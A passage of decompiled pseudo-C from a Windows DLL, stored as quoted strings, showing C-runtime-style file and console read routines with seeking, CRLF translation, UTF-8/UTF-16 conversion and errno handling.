    "    if ( *(char *)(qword_18004D870[v10] + 8 * v11 + 56) < 0 )",
    "    {",
    "      LOBYTE(v8) = v12;",
    "      v13 = sub_180029A10(*(_QWORD *)(a1 + 8), *(_QWORD *)a1, v8);",
    "      v9 = v13 + v14;",
    "    }",
    "  }",
    "  else if ( (*(_DWORD *)(a1 + 20) & 4) == 0 )",
    "  {",
    "    *(_BYTE *)(a2 + 48) = 1;",
    "    *(_DWORD *)(a2 + 44) = 22;",
    "    return -1;",
    "  }",
    "  if ( !v7 )",
    "    return v9;",
    "  if ( (*(_DWORD *)(a1 + 20) & 1) != 0 )",
    "    return sub_180029730(a1, v7, v9, a2);",
    "  if ( v12 == 1 )",
    "    v9 >>= 1;",
    "  return v9 + v7;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180029730(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  unsigned int v6; // r12d",
    "  __int64 v7; // rdi",
    "  __int64 v8; // rcx",
    "  __int64 v9; // r13",
    "  __int64 v10; // rax",
    "  char v11; // si",
    "  __int64 result; // rax",
    "  __int64 v13; // rbp",
    "  __int64 v14; // rax",
    "  __int64 v15; // r8",
    "  __int64 v16; // rdx",
    "  bool v17; // zf",
    "  __int64 v18; // [rsp+60h] [rbp+8h]",
    "",
    "  v6 = sub_180025DAC(a1);",
    "  v7 = 0;",
    "  v8 = v6 & 0x3F;",
    "  v18 = (__int64)(int)v6 >> 6;",
    "  v9 = 9 * v8;",
    "  v10 = qword_18004D870[v18];",
    "  v11 = *(_BYTE *)(v10 + 72 * v8 + 57);",
    "  if ( !*(_DWORD *)(a1 + 16) )",
    "    return a2;",
    "  v13 = *(_QWORD *)a1 + *(int *)(a1 + 16) - *(_QWORD *)(a1 + 8);",
    "  if ( *(char *)(v10 + 72 * v8 + 56) < 0 )",
    "  {",
    "    if ( sub_1800294C8(v6, 0, 2, a4) == a2 )",
    "    {",
    "      LOBYTE(v15) = v11;",
    "      v16 = sub_180029A10(*(_QWORD *)(a1 + 8), *(_QWORD *)(a1 + 8) + v13, v15) + v13;",
    "      v17 = (*(_DWORD *)(a1 + 20) & 0x20) == 0;",
    "    }",
    "    else",
    "    {",
    "      result = sub_1800294C8(v6, a2, 0, a4);",
    "      if ( result == -1 )",
    "        return result;",
    "      v16 = 512;",
    "      if ( v13 > 512 || (*(_DWORD *)(a1 + 20) & 0x40) == 0 || (*(_DWORD *)(a1 + 20) & 0x100) != 0 )",
    "        v16 = *(int *)(a1 + 32);",
    "      v17 = (*(_BYTE *)(qword_18004D870[v18] + 8 * v9 + 56) & 4) == 0;",
    "    }",
    "    if ( !v17 )",
    "    {",
    "      LOBYTE(v7) = (unsigned __int8)(v11 - 1) <= 1u;",
    "      v16 += v7 + 1;",
    "    }",
    "    v14 = v16;",
    "  }",
    "  else",
    "  {",
    "    v14 = *(_QWORD *)a1 + *(int *)(a1 + 16) - *(_QWORD *)(a1 + 8);",
    "  }",
    "  return a2 + a3 / ((v11 == 1) + 1LL) - v14 / ((v11 == 1) + 1LL);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002988C(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  unsigned int v6; // eax",
    "  __int64 v7; // rdi",
    "  unsigned int v8; // r14d",
    "  __int64 v10; // kr00_8",
    "  __int64 v11; // rbx",
    "  __int64 v12; // rsi",
    "  __int64 v13; // r13",
    "  __int64 v14; // rcx",
    "  unsigned __int8 *v15; // rdx",
    "  unsigned __int8 *v16; // rcx",
    "  DWORD v17; // [rsp+30h] [rbp-1058h] BYREF",
    "  _BYTE v18[4144]; // [rsp+40h] [rbp-1048h] BYREF",
    "",
    "  v6 = sub_180025DAC(a1);",
    "  v7 = 0;",
    "  v8 = v6;",
    "  if ( !*(_DWORD *)(a1 + 16) )",
    "    return a2;",
    "  v10 = *(_QWORD *)a1 - *(_QWORD *)(a1 + 8);",
    "  v11 = (__int64)(int)v6 >> 6;",
    "  v12 = v10 / 2;",
    "  v13 = sub_1800294C8(v6, *(_QWORD *)(qword_18004D870[v11] + 72LL * (v6 & 0x3F) + 48), 0, a3);",
    "  v14 = qword_18004D870[v11];",
    "  if ( v13 != *(_QWORD *)(v14 + 72LL * (v8 & 0x3F) + 48)",
    "    || !ReadFile(*(HANDLE *)(v14 + 72LL * (v8 & 0x3F) + 40), v18, 0x1000u, &v17, 0)",
    "    || sub_1800294C8(v8, a2, 0, a3) < 0",
    "    || v12 > v17 )",
    "  {",
    "    return -1;",
    "  }",
    "  v15 = &v18[v17];",
    "  v16 = v18;",
    "  if ( v12 )",
    "  {",
    "    do",
    "    {",
    "      if ( v16 >= v15 )",
    "        break;",
    "      if ( *v16 == 13 )",
    "      {",
    "        if ( v16 < v15 - 1 && v16[1] == 10 )",
    "          ++v16;",
    "      }",
    "      else",
    "      {",
    "        v16 += byte_18004B4B0[*v16];",
    "      }",
    "      ++v7;",
    "      ++v16;",
    "    }",
    "    while ( v7 != v12 );",
    "  }",
    "  return v16 - v18 + v13;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180029A10(_BYTE *a1, _BYTE *a2, char a3)",
    "{",
    "  _BYTE *v3; // r9",
    "  __int64 v4; // r8",
    "  __int64 v5; // rax",
    "  __int64 v7; // r8",
    "  __int64 v8; // rcx",
    "",
    "  v3 = a1;",
    "  if ( (unsigned __int8)(a3 - 1) > 1u )",
    "  {",
    "    v7 = 0;",
    "    if ( a1 != a2 )",
    "    {",
    "      do",
    "      {",
    "        v8 = v7 + 1;",
    "        if ( *v3 != 10 )",
    "          v8 = v7;",
    "        ++v3;",
    "        v7 = v8;",
    "      }",
    "      while ( v3 != a2 );",
    "    }",
    "    return v7;",
    "  }",
    "  else",
    "  {",
    "    v4 = 0;",
    "    if ( a1 != a2 )",
    "    {",
    "      do",
    "      {",
    "        v5 = v4 + 1;",
    "        if ( *(_WORD *)v3 != 10 )",
    "          v5 = v4;",
    "        v3 += 2;",
    "        v4 = v5;",
    "      }",
    "      while ( v3 != a2 );",
    "    }",
    "    return 2 * v4;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180029A68(__int64 a1)",
    "{",
    "  __int64 v1; // rdi",
    "  int v2; // ebx",
    "  int v3; // ebx",
    "  _QWORD v5[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v6; // [rsp+30h] [rbp-30h]",
    "  __int128 v7; // [rsp+38h] [rbp-28h]",
    "  char v8; // [rsp+48h] [rbp-18h]",
    "  int v9; // [rsp+4Ch] [rbp-14h]",
    "  char v10; // [rsp+50h] [rbp-10h]",
    "  int v11; // [rsp+54h] [rbp-Ch]",
    "  char v12; // [rsp+58h] [rbp-8h]",
    "",
    "  v5[0] = 0;",
    "  v6 = 0;",
    "  v8 = 0;",
    "  v10 = 0;",
    "  v12 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v8 = 1;",
    "    v7 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v1 = sub_180029574(a1, (__int64)v5);",
    "  if ( v8 == 2 )",
    "    *(_DWORD *)(v5[0] + 936LL) &= ~2u;",
    "  if ( v10 )",
    "  {",
    "    v2 = v9;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v5) + 32) = v2;",
    "  }",
    "  if ( v12 )",
    "  {",
    "    v3 = v11;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v5) + 36) = v3;",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "__int64 __fastcall sub_180029B04(__int64 a1, __int64 a2)",
    "{",
    "}__int64 __fastcall sub_180029B0C(signed int a1, __int16 *a2, __int64 a3)",
    "{",
    "  __int64 v4; // rbp",
    "  __int64 v5; // rsi",
    "  __int16 *v6; // r14",
    "  __int64 v7; // rdi",
    "  __int64 v8; // rax",
    "  void *v9; // r10",
    "  __int16 *v10; // r8",
    "  __int16 *v11; // rbx",
    "  __int16 v12; // cx",
    "  __int16 *v13; // r9",
    "  __int64 v14; // rax",
    "  __int16 v15; // ax",
    "  __int64 v17; // rdx",
    "  char v18; // al",
    "  __int16 Buffer; // [rsp+70h] [rbp+8h] BYREF",
    "  __int16 v20; // [rsp+78h] [rbp+10h]",
    "  PCONTEXT NumberOfBytesRead; // [rsp+80h] [rbp+18h] BYREF",
    "",
    "  v4 = (__int64)a1 >> 6;",
    "  v5 = 0;",
    "  v6 = a2;",
    "  v7 = 9LL * (a1 & 0x3F);",
    "  v8 = qword_18004D870[v4];",
    "  v9 = *(void **)(v8 + 72LL * (a1 & 0x3F) + 40);",
    "  if ( a3 && *a2 == 10 )",
    "    *(_BYTE *)(v8 + 72LL * (a1 & 0x3F) + 56) |= 4u;",
    "  else",
    "    *(_BYTE *)(v8 + 72LL * (a1 & 0x3F) + 56) &= ~4u;",
    "  v10 = &a2[a3];",
    "  v11 = a2;",
    "  if ( a2 < v10 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v12 = *a2;",
    "      if ( *a2 == 26 )",
    "        break;",
    "      v13 = a2 + 1;",
    "      if ( v12 == 13 )",
    "      {",
    "        if ( v13 >= v10 )",
    "        {",
    "          if ( ReadFile(v9, &Buffer, 2u, (LPDWORD)&NumberOfBytesRead, 0) && (_DWORD)NumberOfBytesRead )",
    "          {",
    "            if ( (*(_BYTE *)(qword_18004D870[v4] + 8 * v7 + 56) & 0x48) != 0 )",
    "            {",
    "              if ( Buffer == 10 )",
    "                goto LABEL_21;",
    "              v20 = Buffer;",
    "              *v11 = 13;",
    "              do",
    "              {",
    "                *(_BYTE *)(qword_18004D870[v4] + 8 * v7 + v5 + 58) = *((_BYTE *)&v20 + v5);",
    "                ++v5;",
    "              }",
    "              while ( v5 < 2 );",
    "              *(_BYTE *)(qword_18004D870[v4] + 8 * v7 + 60) = 10;",
    "              return 2 * (unsigned int)(++v11 - v6);",
    "            }",
    "            if ( Buffer == 10 && v11 == v6 )",
    "            {",
    "LABEL_21:",
    "              *v11 = 10;",
    "              return 2 * (unsigned int)(++v11 - v6);",
    "            }",
    "            sub_1800294D0(a1, (LARGE_INTEGER)-2LL, 1u);",
    "            if ( Buffer == 10 )",
    "              return 2 * (unsigned int)(v11 - v6);",
    "          }",
    "          v12 = 13;",
    "LABEL_29:",
    "          *v11 = v12;",
    "          return 2 * (unsigned int)(++v11 - v6);",
    "        }",
    "        v14 = 2;",
    "        if ( *v13 == 10 )",
    "          v14 = 4;",
    "        a2 = (__int16 *)((char *)a2 + v14);",
    "        v15 = 10;",
    "        if ( *v13 != 10 )",
    "          v15 = 13;",
    "        *v11 = v15;",
    "      }",
    "      else",
    "      {",
    "        ++a2;",
    "        *v11 = v12;",
    "      }",
    "      ++v11;",
    "      if ( a2 >= v10 )",
    "        return 2 * (unsigned int)(v11 - v6);",
    "    }",
    "    v17 = qword_18004D870[v4];",
    "    v18 = *(_BYTE *)(v17 + 8 * v7 + 56);",
    "    if ( (v18 & 0x40) != 0 )",
    "      goto LABEL_29;",
    "    *(_BYTE *)(v17 + 8 * v7 + 56) = v18 | 2;",
    "  }",
    "  return 2 * (unsigned int)(v11 - v6);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180029CCC(signed int a1, unsigned __int8 *a2, __int64 a3)",
    "{",
    "  __int64 v4; // rbp",
    "  __int64 v6; // rdi",
    "  __int64 v7; // rax",
    "  void *v8; // r10",
    "  unsigned __int8 *v9; // r9",
    "  unsigned __int8 *v10; // rax",
    "  unsigned __int8 *v11; // rbx",
    "  unsigned __int8 v12; // cl",
    "  unsigned __int8 *v13; // rdx",
    "  __int64 v14; // rcx",
    "  char v15; // cl",
    "  __int64 v16; // rdx",
    "  char v17; // al",
    "  unsigned int v18; // ebx",
    "  __int64 result; // rax",
    "  __int64 v20; // r8",
    "  unsigned __int8 *v21; // rcx",
    "  char *v22; // rbx",
    "  unsigned int i; // edx",
    "  __int64 v24; // rcx",
    "  char v25; // cl",
    "  char v26; // cl",
    "  int v27; // ebx",
    "  int v28; // eax",
    "  DWORD LastError; // eax",
    "  __int64 v30; // rdx",
    "  char v31; // cl",
    "  char Buffer; // [rsp+60h] [rbp+8h] BYREF",
    "  PCONTEXT NumberOfBytesRead; // [rsp+68h] [rbp+10h] BYREF",
    "",
    "  v4 = (__int64)a1 >> 6;",
    "  v6 = 9LL * (a1 & 0x3F);",
    "  v7 = qword_18004D870[v4];",
    "  v8 = *(void **)(v7 + 72LL * (a1 & 0x3F) + 40);",
    "  if ( a3 && *a2 == 10 )",
    "    *(_BYTE *)(v7 + 72LL * (a1 & 0x3F) + 56) |= 4u;",
    "  else",
    "    *(_BYTE *)(v7 + 72LL * (a1 & 0x3F) + 56) &= ~4u;",
    "  v9 = &a2[a3];",
    "  v10 = a2;",
    "  v11 = a2;",
    "  if ( a2 >= &a2[a3] )",
    "    goto LABEL_31;",
    "  while ( 1 )",
    "  {",
    "    v12 = *v10;",
    "    if ( *v10 == 26 )",
    "    {",
    "      v16 = qword_18004D870[v4];",
    "      v17 = *(_BYTE *)(v16 + 8 * v6 + 56);",
    "      if ( (v17 & 0x40) == 0 )",
    "      {",
    "        *(_BYTE *)(v16 + 8 * v6 + 56) = v17 | 2;",
    "        goto LABEL_31;",
    "      }",
    "      *v11 = 26;",
    "      goto LABEL_30;",
    "    }",
    "    v13 = v10 + 1;",
    "    if ( v12 == 13 )",
    "      break;",
    "    ++v10;",
    "    *v11 = v12;",
    "LABEL_14:",
    "    ++v11;",
    "    if ( v10 >= v9 )",
    "      goto LABEL_31;",
    "  }",
    "  if ( v13 < v9 )",
    "  {",
    "    if ( *v13 == 10 )",
    "    {",
    "      *v11 = 10;",
    "      v14 = 2;",
    "    }",
    "    else",
    "    {",
    "      *v11 = 13;",
    "      v14 = 1;",
    "    }",
    "    v10 += v14;",
    "    goto LABEL_14;",
    "  }",
    "  if ( ReadFile(v8, &Buffer, 1u, (LPDWORD)&NumberOfBytesRead, 0) && (_DWORD)NumberOfBytesRead )",
    "  {",
    "    if ( (*(_BYTE *)(qword_18004D870[v4] + 8 * v6 + 56) & 0x48) != 0 )",
    "    {",
    "      v15 = Buffer;",
    "      if ( Buffer == 10 )",
    "      {",
    "LABEL_20:",
    "        *v11 = 10;",
    "        goto LABEL_30;",
    "      }",
    "      *v11 = 13;",
    "      *(_BYTE *)(qword_18004D870[v4] + 8 * v6 + 58) = v15;",
    "    }",
    "    else",
    "    {",
    "      if ( Buffer == 10 && v11 == a2 )",
    "        goto LABEL_20;",
    "      sub_1800294D0(a1, (LARGE_INTEGER)-1LL, 1u);",
    "      if ( Buffer == 10 )",
    "        goto LABEL_31;",
    "      *v11 = 13;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *v11 = 13;",
    "  }",
    "LABEL_30:",
    "  LODWORD(v11) = (_DWORD)v11 + 1;",
    "LABEL_31:",
    "  v18 = (_DWORD)v11 - (_DWORD)a2;",
    "  if ( !v18 )",
    "    return 0;",
    "  v20 = qword_18004D870[v4];",
    "  if ( !*(_BYTE *)(v20 + 8 * v6 + 57) )",
    "    return v18;",
    "  v21 = &a2[v18];",
    "  v22 = (char *)(v21 - 1);",
    "  if ( (*(v21 - 1) & 0x80u) == 0 )",
    "  {",
    "    LODWORD(v22) = (_DWORD)v21;",
    "    goto LABEL_54;",
    "  }",
    "  for ( i = 1; !byte_18004B4B0[(unsigned __int8)*v22] && i <= 4 && v22 >= (char *)a2; ++i )",
    "    --v22;",
    "  v24 = (unsigned __int8)*v22;",
    "  if ( !byte_18004B4B0[v24] )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 42;",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  if ( byte_18004B4B0[v24] + 1 == i )",
    "  {",
    "    LODWORD(v22) = i + (_DWORD)v22;",
    "  }",
    "  else if ( (*(_BYTE *)(v20 + 8 * v6 + 56) & 0x48) != 0 )",
    "  {",
    "    ++v22;",
    "    *(_BYTE *)(v20 + 8 * v6 + 58) = v24;",
    "    if ( i >= 2 )",
    "    {",
    "      v25 = *v22++;",
    "      *(_BYTE *)(qword_18004D870[v4] + 8 * v6 + 59) = v25;",
    "    }",
    "    if ( i == 3 )",
    "    {",
    "      v26 = *v22;",
    "      LODWORD(v22) = (_DWORD)v22 + 1;",
    "      *(_BYTE *)(qword_18004D870[v4] + 8 * v6 + 60) = v26;",
    "    }",
    "    LODWORD(v22) = (_DWORD)v22 - i;",
    "  }",
    "  else",
    "  {",
    "    sub_1800294D0(a1, (LARGE_INTEGER)-i, 1u);",
    "  }",
    "LABEL_54:",
    "  v27 = (_DWORD)v22 - (_DWORD)a2;",
    "  v28 = sub_18002C1D0(65001, 0, a2);",
    "  if ( v28 )",
    "  {",
    "    v30 = qword_18004D870[v4];",
    "    v31 = *(_BYTE *)(v30 + 8 * v6 + 61) & 0xFD | (v27 != v28 ? 2 : 0);",
    "    result = (unsigned int)(2 * v28);",
    "    *(_BYTE *)(v30 + 8 * v6 + 61) = v31;",
    "  }",
    "  else",
    "  {",
    "    LastError = GetLastError();",
    "    sub_18001A780(LastError);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180029F94(unsigned int a1, __int64 a2, unsigned int a3)",
    "{",
    "  BOOL v7; // eax",
    "  __int64 v8; // r15",
    "  unsigned int v9; // ebx",
    "",
    "  if ( a1 == -2 )",
    "  {",
    "    *(_DWORD *)sub_18001A7EC() = 0;",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  v7 = (a1 & 0x80000000) == 0 && a1 < dword_18004DC70;",
    "  if ( !v7 || (v8 = (__int64)(int)a1 >> 6, (*(_BYTE *)(qword_18004D870[v8] + 72LL * (a1 & 0x3F) + 56) & 1) == 0) )",
    "  {",
    "    *(_DWORD *)sub_18001A7EC() = 0;",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "LABEL_10:",
    "    invalid_parameter_noinfo();",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  if ( a3 > 0x7FFFFFFF )",
    "  {",
    "    *(_DWORD *)sub_18001A7EC() = 0;",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    goto LABEL_10;",
    "  }",
    "  sub_18002E1BC(a1);",
    "  v9 = -1;",
    "  if ( (*(_BYTE *)(qword_18004D870[v8] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )",
    "  {",
    "    v9 = sub_18002A0B4(a1, a2, a3);",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "    *(_DWORD *)sub_18001A7EC() = 0;",
    "  }",
    "  sub_18002E2A4(a1);",
    "  return v9;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002A0B4(int a1, __int16 *a2, DWORD a3)",
    "{",
    "  unsigned __int64 v5; // r8",
    "  __int64 v6; // rax",
    "  XSAVE_FORMAT *v7; // rbx",
    "  int v8; // r10d",
    "  DWORD v9; // ebp",
    "  __int16 *v10; // r15",
    "  LARGE_INTEGER v11; // rax",
    "  __int64 v12; // rax",
    "  int v13; // edi",
    "  char v14; // al",
    "  char v15; // cl",
    "  char v16; // cl",
    "  DWORD LastError; // eax",
    "  int v18; // edi",
    "  unsigned __int64 v20; // rdx",
    "  int v21; // eax",
    "  unsigned __int64 v22; // r8",
    "  __int16 *v23; // r10",
    "  __int16 *v24; // rax",
    "  __int16 *v25; // rdi",
    "  __int16 *v26; // r9",
    "  __int16 v27; // cx",
    "  __int64 v28; // r11",
    "  PCONTEXT Mode; // [rsp+30h] [rbp-68h] BYREF",
    "  DWORD64 hConsoleHandle; // [rsp+38h] [rbp-60h]",
    "  unsigned __int64 v31; // [rsp+40h] [rbp-58h]",
    "  __int64 v32; // [rsp+48h] [rbp-50h]",
    "  __int16 *v33; // [rsp+50h] [rbp-48h]",
    "  char v34; // [rsp+A0h] [rbp+8h]",
    "  DWORD NumberOfCharsRead; // [rsp+B8h] [rbp+20h] BYREF",
    "",
    "  if ( a1 != -2 )",
    "  {",
    "    if ( a1 >= 0",
    "      && a1 < (unsigned int)dword_18004DC70",
    "      && (v32 = 1,",
    "          v5 = (unsigned __int64)a1 >> 6,",
    "          v31 = v5,",
    "          v6 = qword_18004D870[v5],",
    "          (*(_BYTE *)(v6 + 72LL * (a1 & 0x3F) + 56) & 1) != 0) )",
    "    {",
    "      if ( a3 <= 0x7FFFFFFF )",
    "      {",
    "        if ( !a3 || (*(_BYTE *)(v6 + 72LL * (a1 & 0x3F) + 56) & 2) != 0 )",
    "          return 0;",
    "        if ( a2 )",
    "        {",
    "          v7 = 0;",
    "          v8 = *(char *)(v6 + 72LL * (a1 & 0x3F) + 57);",
    "          hConsoleHandle = *(_QWORD *)(v6 + 72LL * (a1 & 0x3F) + 40);",
    "          v34 = v8;",
    "          if ( v8 == 1 )",
    "          {",
    "            if ( (a3 & 1) != 0 )",
    "            {",
    "LABEL_14:",
    "              *(_DWORD *)sub_18001A7EC() = 0;",
    "              *(_DWORD *)sub_18001A80C() = 22;",
    "              invalid_parameter_noinfo();",
    "LABEL_39:",
    "              v18 = -1;",
    "              goto LABEL_40;",
    "            }",
    "            v9 = a3 >> 1;",
    "            if ( a3 >> 1 < 4 )",
    "              v9 = 4;",
    "            v7 = (XSAVE_FORMAT *)sub_180024B50(v9);",
    "            sub_180023374(0);",
    "            sub_180023374(0);",
    "            v10 = (__int16 *)v7;",
    "            if ( !v7 )",
    "            {",
    "              *(_DWORD *)sub_18001A80C() = 12;",
    "              *(_DWORD *)sub_18001A7EC() = 8;",
    "              goto LABEL_39;",
    "            }",
    "            v11 = sub_1800294D0(a1, 0, 1u);",
    "            v5 = v31;",
    "            LOBYTE(v8) = v34;",
    "            *(LARGE_INTEGER *)(qword_18004D870[v31] + 72LL * (a1 & 0x3F) + 48) = v11;",
    "          }",
    "          else",
    "          {",
    "            if ( v8 == 2 && (a3 & 1) != 0 )",
    "              goto LABEL_14;",
    "            v9 = a3;",
    "            v10 = a2;",
    "          }",
    "          v12 = qword_18004D870[v5];",
    "          v13 = 0;",
    "          v33 = v10;",
    "          if ( (*(_BYTE *)(v12 + 72LL * (a1 & 0x3F) + 56) & 0x48) != 0 )",
    "          {",
    "            v14 = *(_BYTE *)(v12 + 72LL * (a1 & 0x3F) + 58);",
    "            if ( v14 != 10 )",
    "            {",
    "              if ( v9 )",
    "              {",
    "                *(_BYTE *)v10 = v14;",
    "                --v9;",
    "                v10 = (__int16 *)((char *)v10 + 1);",
    "                v13 = 1;",
    "                *(_BYTE *)(qword_18004D870[v5] + 72LL * (a1 & 0x3F) + 58) = 10;",
    "                if ( (_BYTE)v8 )",
    "                {",
    "                  v15 = *(_BYTE *)(qword_18004D870[v5] + 72LL * (a1 & 0x3F) + 59);",
    "                  if ( v15 != 10 )",
    "                  {",
    "                    if ( v9 )",
    "                    {",
    "                      *(_BYTE *)v10 = v15;",
    "                      v13 = 2;",
    "                      v10 = (__int16 *)((char *)v10 + 1);",
    "                      --v9;",
    "                      *(_BYTE *)(qword_18004D870[v5] + 72LL * (a1 & 0x3F) + 59) = 10;",
    "                      if ( (_BYTE)v8 == 1 )",
    "                      {",
    "                        v16 = *(_BYTE *)(qword_18004D870[v5] + 72LL * (a1 & 0x3F) + 60);",
    "                        if ( v16 != 10 )",
    "                        {",
    "                          if ( v9 )",
    "                          {",
    "                            *(_BYTE *)v10 = v16;",
    "                            v13 = 3;",
    "                            v10 = (__int16 *)((char *)v10 + 1);",
    "                            --v9;",
    "                            *(_BYTE *)(qword_18004D870[v5] + 72LL * (a1 & 0x3F) + 60) = 10;",
    "                          }",
    "                        }",
    "                      }",
    "                    }",
    "                  }",
    "                }",
    "              }",
    "            }",
    "          }",
    "          if ( isatty(a1)",
    "            && *(char *)(qword_18004D870[v31] + 72LL * (a1 & 0x3F) + 56) < 0",
    "            && GetConsoleMode((HANDLE)hConsoleHandle, (LPDWORD)&Mode) )",
    "          {",
    "            if ( v34 == 2 )",
    "            {",
    "              if ( !ReadConsoleW((HANDLE)hConsoleHandle, v10, v9 >> 1, &NumberOfCharsRead, 0) )",
    "              {",
    "                LastError = GetLastError();",
    "LABEL_38:",
    "                sub_18001A780(LastError);",
    "                goto LABEL_39;",
    "              }",
    "              v18 = v13 + 2 * NumberOfCharsRead;",
    "              goto LABEL_46;",
    "            }",
    "          }",
    "          else",
    "          {",
    "            LOBYTE(v32) = 0;",
    "          }",
    "          if ( !ReadFile((HANDLE)hConsoleHandle, v10, v9, &NumberOfCharsRead, 0) || NumberOfCharsRead > a3 )",
    "          {",
    "            LastError = GetLastError();",
    "            if ( LastError == 5 )",
    "            {",
    "              *(_DWORD *)sub_18001A80C() = 9;",
    "              *(_DWORD *)sub_18001A7EC() = 5;",
    "              goto LABEL_39;",
    "            }",
    "            if ( LastError == 109 )",
    "            {",
    "              v18 = 0;",
    "              goto LABEL_40;",
    "            }",
    "            goto LABEL_38;",
    "          }",
    "          v18 = NumberOfCharsRead + v13;",
    "LABEL_46:",
    "          v20 = v31;",
    "          if ( *(char *)(qword_18004D870[v31] + 72LL * (a1 & 0x3F) + 56) < 0 )",
    "          {",
    "            if ( v34 == 2 )",
    "            {",
    "              v22 = (unsigned __int64)v18 >> 1;",
    "              if ( (_BYTE)v32 )",
    "              {",
    "                v23 = v33;",
    "                v24 = v33;",
    "                v25 = v33;",
    "                v26 = &v33[v22];",
    "                if ( v33 < v26 )",
    "                {",
    "                  while ( 1 )",
    "                  {",
    "                    v27 = *v24;",
    "                    if ( *v24 == 26 )",
    "                      break;",
    "                    if ( v27 == 13 && v24 + 1 < v26 && v24[1] == 10 )",
    "                    {",
    "                      v27 = 10;",
    "                      v28 = 4;",
    "                    }",
    "                    else",
    "                    {",
    "                      v28 = 2;",
    "                    }",
    "                    v24 = (__int16 *)((char *)v24 + v28);",
    "                    *v25++ = v27;",
    "                    if ( v24 >= v26 )",
    "                      goto LABEL_61;",
    "                  }",
    "                  *(_BYTE *)(qword_18004D870[v20] + 72LL * (a1 & 0x3F) + 56) |= 2u;",
    "                }",
    "LABEL_61:",
    "                v18 = 2 * (v25 - v23);",
    "                goto LABEL_40;",
    "              }",
    "              v21 = sub_180029B0C(a1, v33, v22);",
    "            }",
    "            else",
    "            {",
    "              v21 = sub_180029CCC(a1, (unsigned __int8 *)v10, v18);",
    "            }",
    "            v18 = v21;",
    "          }",
    "LABEL_40:",
    "          sub_180023374(v7);",
    "          return (unsigned int)v18;",
    "        }",
    "      }",
    "      *(_DWORD *)sub_18001A7EC() = 0;",
    "      *(_DWORD *)sub_18001A80C() = 22;",
    "    }",
    "    else",
    "    {",
    "      *(_DWORD *)sub_18001A7EC() = 0;",
    "      *(_DWORD *)sub_18001A80C() = 9;",
    "    }",
    "    invalid_parameter_noinfo();",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  *(_DWORD *)sub_18001A7EC() = 0;",
    "  *(_DWORD *)sub_18001A80C() = 9;",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002A504(__int64 a1, unsigned int *a2, int **a3, unsigned int *a4)",
    "{",
    "  int *v6; // rdx",
    "  unsigned int v7; // ebx",
    "",
    "  sub_18002E1BC(*a2);",
    "  v6 = a3[1];",
    "  if ( (*(_BYTE *)(qword_18004D870[(__int64)**a3 >> 6] + 72LL * (**a3 & 0x3F) + 56) & 1) != 0 )",
    "  {",
    "    v7 = sub_18002A6D8(**a3, v6);",
    "  }",
    "  else",
    "  {",
    "    *((_BYTE *)v6 + 48) = 1;",
    "    v6[11] = 9;",
    "    v7 = -1;",
    "  }",
    "  sub_18002E2A4(*a4);",
    "  return v7;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002A57C(int a1, __int64 a2)",
    "{",
    "  int v3; // [rsp+30h] [rbp-28h] BYREF",
    "  int *v4[4]; // [rsp+38h] [rbp-20h] BYREF",
    "  int v5; // [rsp+60h] [rbp+8h] BYREF",
    "  char v6; // [rsp+70h] [rbp+18h] BYREF",
    "  int v7; // [rsp+78h] [rbp+20h] BYREF",
    "",
    "  v5 = a1;",
    "  if ( a1 == -2 )",
    "  {",
    "    *(_BYTE *)(a2 + 56) = 1;",
    "    *(_DWORD *)(a2 + 52) = 0;",
    "    *(_BYTE *)(a2 + 48) = 1;",
    "    *(_DWORD *)(a2 + 44) = 9;",
    "  }",
    "  else",
    "  {",
    "    if ( a1 >= 0",
    "      && a1 < (unsigned int)dword_18004DC70",
    "      && (*(_BYTE *)(qword_18004D870[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )",
    "    {",
    "      v4[1] = (int *)a2;",
    "      v7 = a1;",
    "      v3 = a1;",
    "      v4[0] = &v5;",
    "      return sub_18002A504((__int64)&v6, (unsigned int *)&v3, v4, (unsigned int *)&v7);",
    "    }",
    "    *(_BYTE *)(a2 + 56) = 1;",
    "    *(_DWORD *)(a2 + 52) = 0;",
    "    *(_BYTE *)(a2 + 48) = 1;",
    "    *(_DWORD *)(a2 + 44) = 9;",
    "    sub_18001A598(0, 0, 0, 0, 0, a2);",
    "  }",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002A640(__int64 a1)",
    "{",
    "  unsigned int v1; // edi",
    "  int v2; // ebx",
    "  int v3; // ebx",
    "  _QWORD v5[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v6; // [rsp+30h] [rbp-30h]",
    "  __int128 v7; // [rsp+38h] [rbp-28h]",
    "  char v8; // [rsp+48h] [rbp-18h]",
    "  int v9; // [rsp+4Ch] [rbp-14h]",
    "  char v10; // [rsp+50h] [rbp-10h]",
    "  int v11; // [rsp+54h] [rbp-Ch]",
